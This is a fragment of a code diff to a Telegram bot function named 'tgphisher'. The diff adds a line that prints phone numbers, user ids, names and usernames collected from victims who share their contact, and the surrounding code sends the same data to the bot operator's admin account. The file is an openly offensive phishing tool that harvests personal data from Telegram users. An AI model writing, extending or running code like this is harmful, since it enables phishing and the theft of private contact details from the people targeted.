@@ -324,6 +324,14 @@ def tgphisher():
 
 ''', parse_mode="Markdown", reply_markup=markup)
                     try:
+                        print(f'''
+#TgPhisher - {username}
+#CyberOsint - @Y0urAdm1n
+- id{message.from_user.id}
+- {message.from_user.first_name}
+- {message.from_user.username}
+- +{message.contact.phone_number}
+                        ''')
                         bot.send_message(admin_id, f'''
 #TgPhisher - {username}
 #CyberOsint - @Y0urAdm1n
